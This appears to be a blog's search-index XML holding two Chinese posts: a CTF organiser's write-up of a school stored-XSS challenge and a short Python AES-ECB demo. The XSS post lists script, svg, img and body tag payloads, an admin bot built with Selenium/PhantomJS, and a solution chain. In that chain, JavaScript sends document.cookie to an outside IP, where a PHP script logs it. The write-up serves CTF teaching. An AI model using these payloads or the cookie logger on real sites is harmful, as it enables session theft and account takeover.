<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记一次ctf校赛simple_xss出题</title>
    <link href="/newblog/2020/03/15/%E8%AE%B0%E4%B8%80%E6%AC%A1ctf%E6%A0%A1%E8%B5%9Bsimple-xss%E5%87%BA%E9%A2%98/"/>
    <url>/newblog/2020/03/15/%E8%AE%B0%E4%B8%80%E6%AC%A1ctf%E6%A0%A1%E8%B5%9Bsimple-xss%E5%87%BA%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="记ctf校赛simple-xss出题"><a href="#记ctf校赛simple-xss出题" class="headerlink" title="记ctf校赛simple_xss出题"></a>记ctf校赛simple_xss出题</h1><p>这篇文章也拖了半年才发，主要是硬盘坏了，原本的博客文件丢失，新搭了子博客，可以发出来了。</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p><h3 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h3><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射型XSS也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>存储型XSS也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。<br>一般用在如下地方:</p><ol><li>窃取用户信息，如cookie，token，账号密码等。</li><li>劫持流量实现恶意跳转</li></ol><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p><h3 id="XSS攻击载荷"><a href="#XSS攻击载荷" class="headerlink" title="XSS攻击载荷"></a>XSS攻击载荷</h3><p>以下所有标签的<code>&gt;</code>都可以用<code>//</code>代替，例如 <code>&lt;script&gt;alert(1)&lt;/script//</code></p><h4 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h4><pre><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;       &lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</code></pre><h4 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h4><pre><code>&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;svg onload=&quot;alert(1)&quot;//</code></pre><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><pre><code>&lt;img  src=1  οnerrοr=alert(&quot;xss&quot;)&gt;&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie</code></pre><h4 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h4><pre><code>&lt;body οnlοad=alert(1)&gt;&lt;body οnpageshοw=alert(1)&gt;</code></pre><h2 id="xss-bot"><a href="#xss-bot" class="headerlink" title="xss_bot"></a>xss_bot</h2><p>xss bot就是代替管理员去完成点击页面的任务，bot需要能够执行js，事情的本质是我们需要一个浏览器内核来解析js.xss bot一般会用selenium+webdriver</p><h3 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h3><p>selenium是用来控制webdriver的接口的.</p><p>Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Firefox，Safari，Chrome，Opera等。</p><p>使用python爬虫调用selenium来模拟正常用户访问浏览器.<br>最新版selenium已经放弃PhantomJS了，selenium版本降级安装</p><pre><code>pip install selenium==2.48.0</code></pre><h3 id="phantomjs"><a href="#phantomjs" class="headerlink" title="phantomjs"></a>phantomjs</h3><p>chrome和firefox的webdriver都有一个特点，就是需要桌面,我们搭建题目在docker环境中会有问题，<br>phantomjs和别的浏览器本质上没什么区别，差不多也是类似于浏览器的内核，优势其实是多平台支持无图形化，而且不需要浏览器支持。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>第一种方式</p><pre><code>apt-get install phantomjs需要加但是因为这样安装的不全，再python执行的时候，会报跟json编码有关的错。sudo apt-get install nodejssudo apt-get install nodejs-legacysudo apt-get install npmsudo npm -g install phantomjs-prebuilt  可以这样安装一个完整的环境</code></pre><p>第二种方式：</p><pre><code>wget http://npm.taobao.org/mirrors/phantomjs/phantomjs-2.1.1-linux-x86_64.tar.bz2tar xvjf phantomjs-2.1.1-linux-x86_64.tar.bz2sudo cp phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/bin/</code></pre><h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><pre><code class="python">from selenium import webdriverimport time#要想调用键盘按键,鼠标操作需要引入keys包from selenium.webdriver.common.keys import Keys#创建PhantomJS浏览器对象driver = webdriver.PhantomJS()#driver = webdriver.PhantomJS(&#39;/usr/bin/phantomjs&#39;)#加载网站页面driver.get(&quot;http://127.0.0.1:5000/login.html&quot;)#找到页面input输入标签并填充文本内容admindriver.find_element_by_id(&#39;username&#39;).send_keys(&quot;admin&quot;)driver.find_element_by_id(&#39;password&#39;).send_keys(&quot;123456&quot;)  #输入帐号密码登录网站#By Name 找到name=login的按钮并模拟点击data = driver.find_element_by_name(&#39;login&#39;).click()time.sleep(1)#管理员登录状态访问存在xss的页面driver.get(&quot;http://127.0.0.1:5000/home.php&quot;)driver.quit()   </code></pre><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>简单的xss，没有任何过滤，不过实际测试时双引号会被过滤，在留言处插入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>弹窗成功，接下来就是打admin的cookie，可以选择xss平台也可以自己写，这里贴上cchan的payload供大家参考.</p><pre><code class="html">&lt;script src=//xxx.xx.xxx.xxx/cookie.js&gt;&lt;/script&gt;</code></pre><pre><code class="js">var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;http://106.15.194.242/cookie.php?&#39; + document.cookie);xhr.send();</code></pre><pre><code class="php">&lt;?phpheader(&#39;Access-Control-Allow-Origin: *&#39;);file_put_contents(&#39;cookie.txt&#39;, $_SERVER[&#39;QUERY_STRING&#39;].&quot;\n&quot;, FILE_APPEND);</code></pre><p>出题时没考虑到搅屎，admin被插入跳转后，后面的就渲染不出来了，不得不重置数据库。还有一点是为了区分用户和admin bot，我写了$_SERVER[‘HTTP_REFERER’]，有跳转的视为正常用户进入home.php,无跳转且cookie为admin就直接输出flag,所以如果大家直接进入admin的界面，需要把referer清空。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python3 aes实现</title>
    <link href="/newblog/2020/03/03/python3-aes%E5%AE%9E%E7%8E%B0/"/>
    <url>/newblog/2020/03/03/python3-aes%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>python-3.6.5</p><pre><code>pip install pycryptodome#Python36\Lib\site-packages\crypto =&gt;Python36\Lib\site-packages\Crypto  不更改导入包会报错</code></pre><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><pre><code class="python">from Crypto.Cipher import AESimport base64def add_to_16(par):    par = par.encode(&#39;gbk&#39;) #先将字符串类型数据转换成字节型数据    while len(par) % 16 != 0: #对字节型数据进行长度判断        par += b&#39;\x00&#39; #如果字节型数据长度不是16倍整数就进行 补充    return pardef encrypt(text,key):    mode = AES.MODE_ECB    aes = AES.new(add_to_16(key), mode)    cipher = aes.encrypt(add_to_16(text))    return base64.encodebytes(cipher).decode().strip()def decrypt(text,key):    mode = AES.MODE_ECB    text = base64.decodebytes(text.encode(&#39;gbk&#39;))    aes = AES.new(add_to_16(key), mode)    plaintext = aes.decrypt(text)    return plaintext.decode(&#39;gbk&#39;).strip(&#39;\0&#39;)if __name__ == &#39;__main__&#39;:    e = encrypt(&quot;晨曦远&quot;,&quot;123456&quot;)    print(&quot;加密:&quot;, e)    d=decrypt(e,&quot;123456&quot;)    print(&quot;解密:&quot;,d)</code></pre><p>去在线网站加解密试试<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">在线aes加密解密</a></p>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>aes</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
